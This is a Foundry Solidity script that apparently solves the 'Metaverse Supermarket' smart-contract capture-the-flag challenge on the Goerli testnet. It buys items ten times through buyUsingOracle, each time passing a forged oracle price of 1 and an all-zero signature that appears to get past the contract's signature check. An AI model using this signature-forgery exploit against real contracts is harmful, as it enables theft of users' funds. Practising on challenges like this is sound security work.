// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengeMetaverseSupermarket.sol";

// https://goerli.etherscan.io/address/0x5daE25125930F1523e78c8e8152c432C4Ee4eb02
contract ChallengeMetaverseSupermarketScript is Script {
    address constant instance = 0x5daE25125930F1523e78c8e8152c432C4Ee4eb02;

    function run() public {
        vm.startBroadcast();

        InflaStore store = InflaStore(instance);
        Infla infla = store.infla();
        Meal meal = store.meal();

        infla.approve(address(store), type(uint256).max);

        for (uint256 index; index < 10; ++index) {
            OraclePrice memory price = OraclePrice(block.number, 1);
            Signature memory signature = Signature(27, 0, 0);
            store.buyUsingOracle(price, signature);
        }

        console.log("Meal count:", meal.balanceOf(msg.sender));
    }
}
